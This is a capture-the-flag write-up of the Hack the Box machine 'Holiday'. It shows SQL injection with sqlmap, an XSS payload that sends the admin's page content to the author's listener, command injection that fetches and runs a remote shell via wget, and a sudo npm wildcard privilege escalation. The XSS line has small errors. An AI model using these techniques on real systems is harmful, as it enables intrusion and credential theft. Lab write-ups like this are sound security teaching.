---
layout: post
title:  "Hack the Box - Let's Take a Holiday"
date:   2015-11-19 16:16:01 -0600
categories: hackthebox xss html sqli node npm hacking wildcard writeup
---

<img class="header-img" src="{{ "img/holiday/home.png" | relative_url }}" />

The latest box retired (and thus can be written about) from <a href="https://hackthebox.eu">Hack the Box</a> is Holiday! This one has a wide variety of different techniques that you have to put to use. Let's go.

{% highlight shell %}
~ » nmap 10.10.10.35 -p 1-65536 -sS -A
Starting Nmap 7.60 ( https://nmap.org ) at 2017-11-19 16:40 EST
Nmap scan report for 10.10.10.25
Host is up (0.022s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c3:aa:3d:bd:0e:01:46:c9:6b:46:73:f3:d1:ba:ce:f2 (RSA)
|   256 b5:67:f5:eb:8d:11:e9:0f:dd:f4:52:25:9f:b1:2f:23 (ECDSA)
|_  256 79:e9:78:96:c5:a8:f4:02:83:90:58:3f:e5:8d:fa:98 (EdDSA)
8000/tcp open  http    Node.js Express framework
|_http-title: Error
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=11/19%OT=22%CT=1%CU=43111%PV=Y%DS=2%DC=T%G=Y%TM=5A11FA
OS:8B%P=x86_64-unknown-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS
OS:=8)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M
OS:54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=71
OS:20)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   18.26 ms 10.10.14.1
2   18.43 ms 10.10.10.25

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.71 seconds
{% endhighlight %}

Right away, it looks like the only interesting result is Node.js running on port 8000. It takes us to a landing page without any links, so that means it's `dirb` time, and that almost immediately finds the /admin portal:
{% highlight shell %}
~ » dirb http://holiday.htb:8000
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

[...]                                                       

---- Scanning URL: http://holiday.htb:8000/ ----
+ http://holiday.htb:8000/admin (CODE:302|SIZE:28) 
[...]
{% endhighlight %}

Whenever we hit a login page, its smart to run sqlmap on it as you poke at it yourself. Sometimes it will find something you wouldn't, or vice versa. In this case, initially running sqlmap returns a 404:
{% highlight shell %}
~ » sqlmap -u http://holiday.htb:8000/login --data="username=a&password=b" --proxy=http://localhost:8080 
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.1.10#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 17:01:18

[17:01:18] [INFO] testing connection to the target URL
[17:01:18] [CRITICAL] page not found (404)
{% endhighlight %}

Since we're running sqlmap through our Burp proxy (you are, right?), we can compare our manual test to sqlmap's. This allows me to see that the only missing piece is our User-Agent. Luckily, sqlmap has a solution for that:
{% highlight shell %}
~ » sqlmap -u http://holiday.htb:8000/login --data="username=a&password=b" --proxy=http://localhost:8080 --random-agent
{% endhighlight %}
and it runs successfully and tells us know that `username` is injectable, and that this is a SQLlite database.
{% highlight shell %}
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 720 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=a") OR NOT 3880=3880 AND ("gFXq"="gFXq&password=b
---
{% endhighlight %}

We can then dump the database table names, and then users table to get the following:
```
[17:10:45] [INFO] retrieved: fdc8cd4cff2c19e0d1022e78481ddf36
[17:10:58] [INFO] retrieved: RickA
```
You can crack the hash via your preferred method (<a href="https://crackstation.net">CrackStation</a> is usually good for these purposes), and login as RickA.
<img src="{{ "img/holiday/login.png" | relative_url }}" />
It looks like we're in some sort of holiday booking system. We have the ability to view bookings and add notes to the bookings. Something that caught my eye is the following text on the "Add Note" page:
```
All notes must be approved by an administrator - this process can take up to 1 minute.
```
When we try to add a note, it appears after ~1 minute, meaning there is some kind of "manual" review step. This should make you think of <a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">XSS</a> right away. Something that threw me at first is that the cookies are <a href="https://www.owasp.org/index.php/HttpOnly">HttpOnly</a>, which usually means we can't actually steal any cookies; however, since our other enumerations have come up with squat, let's give it a try.

XSS can be extremely painful to exploit, as it is highly browser dependant, and we don't know if the admin is using Firefox or Chrome; if they have XSS security flags enabled or disabled; etc. So let's just brute force it: OWASP has a <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">great cheat sheet</a> of XSS evasion techniques. 

The goal is to get the "admin" browser to make a web request to us with all of the information we can possible send. The first step is to start a simple HTTP client so that we can actually receive the requests:
{% highlight shell %}
~ » python2 -m SimpleHTTPServer 8000 
Serving HTTP on 0.0.0.0 port 8000 ...
{% endhighlight %}
and then think about what kind of HTML we can inject that will send us the data we want. We know the cookies are a bust, so let's just get the HTTP content to start (sidenote: I'm using an `img` tag because trial and elimination determined it was something that didn't get as escaped):
{% highlight html %}
<img src="deadbeef" onerror="eval(this.src='http://10.10.14.26:8000/?x='+bto(document.documentElement.innerHTML;)">
{% endhighlight %}
Next, we have to perform various obfuscations on it to get past the server-side filter (hint: look into `String.fromCharCode`) until we finally get a response from the admin:
{% highlight shell %}
10.10.10.25 - - [19/Nov/2017 17:36:30] "GET /?x=PGhlYWQ+CiAgICAgID...
{% endhighlight %}
which we just have to base64 decode back into HTML. This contains a hidden input with the admin's cookie (a little too conviently; not sure why they just didn't use non-HttpOnly cookies). Now we just have to use a cookie manager to overwrite our cookie with the admin's, and navigate to `/admin`.
<img src="{{ "img/holiday/admin.png" | relative_url }}" />
This page allows us to export from the bookings and notes database tables. The data is returned after a `GET` request to `/admin/export?table=`. If we play around with the `table` parameter, the following error appears:
`Invalid table name - only characters in the range of [a-z0-9&\s\/] are allowed` - so we have a blacklist to bypass. We also very quickly find that the export lets us execute arbitray commands:
```
GET /admin/export?table=bookings%26ls
index.js
layouts
node_modules
package.json
setup
static
views
1|e2d3f450-bdf3-4c0a-8165-e8517c94df9a|Wilber
[...]
```
We're close to a shell, we just need to figure out how we can get our IP address into a file/command, despite `.` being on the blacklist. Luckily, tools like `wget`, `curl`, etc can parse IP addresses in various interesting ways, but the one that is valuable here is <a href="http://www.smartconversion.com/unit_conversion/IP_Address_Converter.aspx">the long ip format</a>. This means we can download a shell from our computer onto the victim, and then execute it via something like `GET /admin/export?table=bookings%26wget+[YOURLONGIP]/shell HTTP/1.1` followed by `GET /admin/export?table=bookings%26bash+shell HTTP/1.1`.

Now that we have a shell, we can `cat user.txt` and look into privledge escalation. Right away `sudo -l` gives us our route:
{% highlight shell %}
algernon@holiday:~/app$ sudo -l
Matching Defaults entries for algernon on holiday:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User algernon may run the following commands on holiday:
    (ALL) NOPASSWD: /usr/bin/npm i *
{% endhighlight %}

Super simple. After doing some basic recon on npm, we find that:
1. `npm i` will build any directory with a `package.json` file
2. `package.json` files can contain `preinstall` scripts
3. `preinstall` will execute arbitrary bash commands

The only hurdle is that by default, npm won't run "unsafe" (sh) commands, so we need to trick it. Since there's wildcard in there, it's obvious that this is the typical wildcard exploit where we pass in a command line parameter as a folder name (`--unsafe-perm`), and, voila:
{% highlight shell %}
algernon@holiday:/$ cd /dev/shm
algernon@holiday:/dev/shm$ mkdir overcast && cd overcast
algernon@holiday:/dev/shm/overcast$ mkdir -- --unsafe-perm
algernon@holiday:/dev/shm/overcast$ mkdir -- zpackage
algernon@holiday:/dev/shm/overcast$ cat << EOF >> zpackage/package.json
> {"name": "zpackage", "version": "1.0.0", "description": "root", "scripts": {"preinstall":"cat /root/root.txt >> /dev/shm/overcast/root.txt"}}
EOF
algernon@holiday:/dev/shm/overcast$ sudo -u root /usr/bin/npm i *
[... npm install ...]
algernon@holiday:/dev/shm/overcast$ ls
root.txt
--unsafe-perm
package
{% endhighlight %}

_fin_